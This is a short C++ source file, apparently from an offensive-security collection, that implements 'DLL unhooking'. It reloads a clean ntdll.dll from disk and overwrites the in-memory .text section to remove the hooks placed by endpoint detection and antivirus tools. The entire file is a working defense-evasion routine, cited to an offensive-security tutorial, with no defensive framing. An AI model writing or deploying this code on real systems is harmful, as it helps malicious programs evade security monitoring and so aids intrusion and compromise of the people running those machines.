/*
Title: DLL Unhooking
Resources:
	- https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
*/
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>

BOOL DllUnhooking() {
	HANDLE hProcess = GetCurrentProcess();
	
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return FALSE;

	MODULEINFO mi = {};
	if (!GetModuleInformation(hProcess, hNtdll, &mi, sizeof(mi)))
		return FALSE;
	
	LPVOID lpDllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE hDllFile = CreateFile(
        L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr);
	if (!hDllFile) return FALSE;
	HANDLE hDllMapping = CreateFileMapping(
        hDllFile,
        nullptr,
        PAGE_READONLY | SEC_IMAGE,
        0,
        0,
        nullptr
    );
	if (!hDllMapping) {
		CloseHandle(hDllFile);
		return FALSE;
	}
	LPVOID lpDllMapViewAddr = MapViewOfFile(hDllMapping, FILE_MAP_READ, 0, 0, 0);
	if (!lpDllMapViewAddr) {
		CloseHandle(hDllFile);
		CloseHandle(hDllMapping);
        return FALSE;
	}

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpDllBase;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpDllBase + pDosHeader->e_lfanew);
	for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSecHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)pSecHeader->Name, (char*)".text")) {
			DWORD dwOldProtect = 0;
			VirtualProtect(
				(LPVOID)((DWORD_PTR)lpDllBase + (DWORD_PTR)pSecHeader->VirtualAddress),
				pSecHeader->Misc.VirtualSize,
				PAGE_EXECUTE_READWRITE,
				&dwOldProtect
			);
			memcpy(
				(LPVOID)((DWORD_PTR)lpDllBase + (DWORD_PTR)pSecHeader->VirtualAddress),
				(LPVOID)((DWORD_PTR)lpDllMapViewAddr + (DWORD_PTR)pSecHeader->VirtualAddress),
				pSecHeader->Misc.VirtualSize
			);
			VirtualProtect(
				(LPVOID)((DWORD_PTR)lpDllBase + (DWORD_PTR)pSecHeader->VirtualAddress),
				pSecHeader->Misc.VirtualSize,
				dwOldProtect,
				&dwOldProtect
			);
		}
	}

	CloseHandle(hDllFile);
	CloseHandle(hDllMapping);

	return TRUE;
}
